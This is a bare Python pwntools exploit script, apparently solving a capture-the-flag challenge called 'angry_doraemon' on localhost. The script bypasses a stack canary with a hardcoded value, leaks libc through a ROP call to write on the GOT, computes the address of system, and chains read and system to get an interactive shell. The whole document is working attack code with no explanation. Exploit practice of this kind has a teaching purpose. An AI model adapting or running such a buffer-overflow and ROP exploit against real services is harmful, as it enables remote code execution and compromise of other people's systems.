from pwn import *
canary =  0x67fcc100
p = remote("localhost", 8888)
elf = ELF("./angry_doraemon")
write_plt = elf.plt['write']
write_got = elf.got['write']
bss = elf.bss()
read_plt = elf.plt['read']
pppr = 0x80495bd
offset = 0x9ac50
print p.recv(1024)
print p.recv(1024)

p.sendline("4")

print p.recv(1024)
payload = ""

payload = "y"*10
payload += p32(canary)
payload += "b"*12

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(4)
payload += p32(write_got)
payload += p32(8)

p.sendline(payload)


write = u32(p.recv(4))
system_libc = write-offset

p.close()

p = remote("localhost", 8888)

print p.recv(1024)
print p.recv(1024)
print p.recv(1024)

p.sendline("4")

payload = "y"*10
payload += p32(canary)
payload += "b"*12

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(4)

payload += p32(system_libc)
payload += "aaaa"
payload += p32(bss)

p.sendline(payload)

p.interactive()
